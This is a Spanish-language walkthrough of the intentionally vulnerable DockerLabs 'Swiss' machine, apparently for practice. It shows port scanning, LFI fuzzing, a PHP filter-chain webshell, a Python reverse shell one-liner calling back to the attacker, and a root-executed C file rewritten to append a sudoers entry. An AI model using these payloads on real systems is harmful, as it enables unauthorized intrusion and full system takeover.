---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Swiss DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip swiss.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh swiss.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:13 EST
Nmap scan report for 172.17.0.2
Host is up (0.00013s latency).

PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f1:2d:b0:54:e3:57:94:c8:3a:1a:7a:ba:d8:2d:7e:f9 (ECDSA)
|_  256 cc:70:cb:29:31:d9:48:f7:e2:2f:ec:b2:65:8c:ee:8e (ED25519)
80/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: \xF0\x9F\x91\x8B Mario \xC3\x81lvarez Fer\xC5\x84andez
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.13 seconds
```

Vemos que hay `2` puertos abiertos, si entramos en la pagina que hay alojada en el puerto `80` veremos una pagina aparentemente normal, por lo que vamos a realizar un poco de `fuzzing`, pero si lo hacemos con `gobuster` no vamos a ver muchos resultados ya que algo lo esta bloqueando, pero si investigamos y le damos a `Sobre Mi` vemos en la `URL` que nos lleva a un `index.php`, ya que como tiene una extension `.php` vamos a probar a realizar un poco de `fuzzing` con la extension por si tuviera alguna vulnerabilidad de un `LFI`.

## FFUF

```shell
ffuf -u http://<IP>/index.php\?FUZZ\=/etc/passwd -w <WORDLIST> -fs 22274
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/index.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 22274
________________________________________________

file                    [Status: 200, Size: 23613, Words: 6185, Lines: 475, Duration: 1ms]
:: Progress: [20469/20469] :: Job [1/1] :: 2000 req/sec :: Duration: [0:00:11] :: Errors: 51 ::
```

Vemos que encontramos un parametro llamado `file` el cual es vulnerable a un `LFI`, por lo que probaremos a realizar lo siguiente:

```
URL = http://<IP>/index.php?file=/etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
darks:x:1001:1001::/home/darks:/bin/rbash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
cristal:x:1002:1002:,,,:/home/cristal:/bin/bash
tcpdump:x:102:105::/nonexistent:/usr/sbin/nologin
```

Vemos que funciona correctamente, vamos a comprobar si se pudieran utilizar `wrappers` junto con este `LFI` para poder ejecutar codigo de forma remota y no solo leer archivos.

## Escalate user www-data

### Wrappers de LFI

URL = [Generated Payload Code GitHub](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)

Si queremos por ejemplo crear un parametro llamado `cmd` que ejecute cualquier comando que le pongamos, seria de la siguiente forma...

```shell
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

Info:

```
[+] The following gadget chain will generate the following code : <?php echo shell_exec($_GET["cmd"]);?> (base64 value: PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjbWQiXSk7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Copiamos eso y lo metemos despues del igual de la siguiente manera...

```
URL = http://<IP>/index.php?cmd=ls -la&file=<CONTENT_GENERATE>
```

Info:

```
total 46008
drwxr-xr-x 1 root root     4096 Nov 11 20:24 .
drwxr-xr-x 1 root root     4096 Nov 12 08:17 ..
-rw-r--r-- 1 root root 15677440 Nov 11 20:23 credentials.txt
drwxr-xr-x 2 root root     4096 Nov 10 06:57 docencia
drwxr-xr-x 2 root root     4096 Nov 10 06:51 images
-rw-r--r-- 1 root root    22348 Nov 10 07:20 index.php
-rw-r--r-- 1 root root 31354880 Nov 11 20:24 pagina_web.tar
drwxr-xr-x 2 root root     4096 Nov 10 06:51 scripts
drwxr-xr-x 2 root root     4096 Nov 10 16:07 sobre-mi
-rw-r--r-- 1 root root    26888 Nov 10 06:51 styles.css
�
P�����
```

Vemos que funciona, por lo que ahora vamos a intentar crearnos una `reverse shell` de la siguiente forma:

Primero nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora ejecutaremos el siguiente comando para crearnos la `shell`:

```
URL = http://<IP>/index.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' &file=<CONTENT_GENERATE>
```

Y si volvemos donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 45316
$ whoami
whoami
www-data
```

Ahora tendremos que sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user

Si nos vamos a la siguiente ruta:

```shell
cd /var/www
```

Vemos un archivo bastante interesante llamado `sendinv2` que contiene un texto compilado, pero hay partes medio legibles, pero si utilizamos la herramienta `strings` podremos ver la siguiente parte bastante interesante:

```shell
strings sendinv2
```

Info:

```
FDTS42ZKNCWOYZSHF2GEM2NM5NFO53HLIZUUMLDI44GOULNPBUFSMTUIRMVQULTJFEEE3DCNZHGQYSXHF5ESR2WOVEUOVTVLEZUU4DDJBJGQY3JIJWGGM2SNQFESSCON
RRW4WTMMNUUE522LBFHMSKHGV3ESSCSOBNFONLMJFDTK2C2I5CWOWSHKVTWCVZVGBNFQSTMMN4XOZ3EI5KWOWKXNB3GG3SKNBRW2VLHMRDWY3DCLBBHMCSPNFBGUY3N
R5GIR2GONHW2UTZMIZUE2TBI44XUZCHHF3U4RCVPJKTA4CHJFCG6Z22I5WHUWTOJIYWIR2FJMFA===
%s%s%s%s%s%s
Error al crear el socket
172.17.0.188
Error al enviar datos
```

Vemos que se esta intentando conectar a la `IP` denominada `172.17.0.188`, por lo que vamos añadirnos esa `IP` a nuestro `host` para ver que podemos recibir o que esta enviando.

```shell
ip address del 172.17.0.188/16 dev docker0 # Eliminamos nuestra IP
ip address add 172.17.0.188/16 dev docker0 # Añadimos la IP nueva
```

Ahora haremos lo siguiente, nos pondremos a la escucha a la espera de recibir paquetes de red con el siguiente comando:

```shell
tcpdump -i docker0
```

Y en la maquina victima ejecutaremos el `binario` para ver que recibimos:

```shell
./sendinv2
```

Ahora si volvemos a donde tenemos la escucha de paquetes veremos todo este trafico:

```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on docker0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
14:53:36.369792 ARP, Request who-has 172.17.0.2 tell 192.168.5.186, length 28
14:53:36.370025 ARP, Reply 172.17.0.2 is-at 02:42:ac:11:00:02 (oui Unknown), length 28
14:53:36.370027 IP 192.168.5.186.7755 > 172.17.0.2.45316: Flags [P.], seq 2403028148:2403028149, ack 1771868096, win 2443, options [nop,nop,TS val 1340143708 ecr 2825540779], length 1
14:53:36.370513 IP 172.17.0.2.45316 > 192.168.5.186.7755: Flags [P.], seq 1:2, ack 1, win 251, options [nop,nop,TS val 2826141998 ecr 1340143708], length 1
14:53:39.011726 ARP, Request who-has 172.17.0.188 tell 172.17.0.2, length 28
14:53:39.011732 ARP, Reply 172.17.0.188 is-at 02:42:2f:f6:d7:07 (oui Unknown), length 28
14:53:39.011780 IP 172.17.0.2.51118 > 172.17.0.188.7777: UDP, length 336
14:53:39.011841 IP 172.17.0.188 > 172.17.0.2: ICMP 172.17.0.188 udp port 7777 unreachable, length 372
^C
39 packets captured
39 packets received by filter
0 packets dropped by kernel
```

Vemos esta linea de aqui:

```
14:53:39.011841 IP 172.17.0.188 > 172.17.0.2: ICMP 172.17.0.188 udp port 7777 unreachable, length 372
```

Estamos viendo que se esta intentando conectar por el puerto `7777` mediante `UDP`, por lo que nosotros vamos a estar escuchando por ese puerto pero por `UDP` a ver que nos llega:

```shell
nc -lvnp 7777
```

Ahora si volvemos a ejecutar el binario, en la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [172.17.0.188] from (UNKNOWN) [172.17.0.2] 44619
MFDTS42ZKNCWOYZSHF2GEM2NM5NFO53HLIZUUMLDI44GOULNPBUFSMTUIRMVQULTJFEEE3DCNZHGQYSXHF5ESR2WOVEUOVTVLEZUU4DDJBJGQY3JIJWGGM2SNQFESSCONRRW4WTMMNUUE522LBFHMSKHGV3ESSCSOBNFONLMJFDTK2C2I5CWOWSHKVTWCVZVGBNFQSTMMN4XOZ3EI5KWOWKXNB3GG3SKNBRW2VLHMRDWY3DCLBBHMCSPNFBGUY3NNR5GIR2GONHW2UTZMIZUE2TBI44XUZCHHF3U4RCVPJKTA4CHJFCG6Z22I5WHUWTOJIYWIR2FJMFA====
```

Vemos que nos esta llegando un mensaje en `Base32` y despues en `Base64`, si lo decodificamos veremos lo siguiente:

```
hola! somos el grupo BlackCat, pensamos en encriptar este server pero no tiene nada de interes, te ahorrare tiempo: cristal:dropchostop453SJF : disfruta
```

Vemos que obtenemos unas credenciales, por lo que nos conectaremos por `ssh`.

### SSH

```shell
ssh cristal@<IP>
```

Metemos como contraseña `dropchostop453SJF` y veremos que estamos dentro.

## Escalate Privileges

Si vemos a que grupos pertenecemos, veremos lo siguiente:

```shell
id
```

Info:

```
uid=1002(cristal) gid=1002(cristal) groups=1002(cristal),100(users),1003(editor)
```

Vemos que pertenecemos a un grupo llamado `editor` bastante interesante, por lo que vamos a ver si ese grupo esta sujeto algun archivo de la siguiente forma:

```shell
find / -type f -group editor 2>/dev/null
```

Info:

```
/home/cristal/systm.c
```

Vemos que esta sujeto a ese archivo y podremos editarlo, si vemos que contiene:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <time.h>

void log_system_info(const char *filename) {
    FILE *log_file = fopen(filename, "a");
    if (log_file == NULL) {
        perror("Error al abrir el archivo de log");
        exit(EXIT_FAILURE);
    }

    // Información del sistema
    struct utsname sys_info;
    if (uname(&sys_info) < 0) {
        perror("Error al obtener información del sistema");
        exit(EXIT_FAILURE);
    }

    // Tiempo de inicio del sistema
    struct timespec uptime;
    if (clock_gettime(CLOCK_BOOTTIME, &uptime) < 0) {
        perror("Error al obtener el tiempo de inicio del sistema");
        exit(EXIT_FAILURE);
    }
    time_t boot_time = time(NULL) - uptime.tv_sec;

    // Escribir la información en el archivo de log
    fprintf(log_file, "-----------------------------\n");
    fprintf(log_file, "Fecha y Hora: %s", ctime(&boot_time));
    fprintf(log_file, "Nombre del Sistema: %s\n", sys_info.sysname);
    fprintf(log_file, "Nombre del Host: %s\n", sys_info.nodename);
    fprintf(log_file, "Versión del Sistema: %s\n", sys_info.release);
    fprintf(log_file, "Versión del Kernel: %s\n", sys_info.version);
    fprintf(log_file, "Arquitectura de Hardware: %s\n", sys_info.machine);
    fprintf(log_file, "-----------------------------\n");

    fclose(log_file);
}

int main() {
    const char *log_filename = "/tmp/registros.log";

    log_system_info(log_filename);

    return 0;
}
```

Vemos que no hace gran cosa, pero vamos a ver que procesos se esta ejecutando:

```shell
ps -aux
```

Info:

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4324  3200 ?        Ss   14:12   0:00 /bin/bash /usr/local/bin/start.sh
root          24  0.0  0.2 203460 21816 ?        Ss   14:12   0:00 /usr/sbin/apache2 -k start
www-data      36  0.0  0.2 211276 21556 ?        S    14:12   0:02 /usr/sbin/apache2 -k start
root          40  0.0  0.0  12020  3976 ?        Ss   14:12   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          41  0.0  0.0   4324  3328 ?        S    14:12   0:00 /bin/bash /home/cristal/systm.sh
root          42  0.0  0.0   4324  3200 ?        S    14:12   0:00 /bin/bash /root/kill.sh
root          44  0.0  0.0   2728  1536 ?        S    14:12   0:00 tail -f /dev/null
................................................
```

Vemos que `root` esta ejecutando `/home/cristal/systm.sh` y si leemos que hace este script:

```shell
#!/bin/bash

var1="/home/cristal/systm.c"
var2="/home/cristal/syst"

while true; do
      gcc -o $var2 $var1
      $var2
      sleep 15
done
```

Vemos que esta compilando el archivo `/home/cristal/systm.c` y lo esta llamado `/home/cristal/syst`, seguidamente lo ejecuta, por lo que vamos a realizar lo siguiente:

```shell
nano /home/cristal/systm.c

#Dentro del nano
#include <stdlib.h>

int main() {
    // Comando a ejecutar
    const char *command = "echo 'cristal    ALL=(ALL:ALL) ALL' >> /etc/sudoers";

    // Ejecutar el comando usando system()
    (void)system(command); // Ignorar el resultado

    return 0;
}
```

Lo guardamos, esperamos unos segundos y si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for cristal on 2704bac91ebd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cristal may run the following commands on 2704bac91ebd:
    (ALL : ALL) ALL
    (ALL : ALL) ALL
    (ALL : ALL) ALL
    (ALL : ALL) ALL
```

Por lo que haremos lo siguiente:

```shell
sudo su
```

Info:

```
root@2704bac91ebd:/home/cristal# whoami
root
```

Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
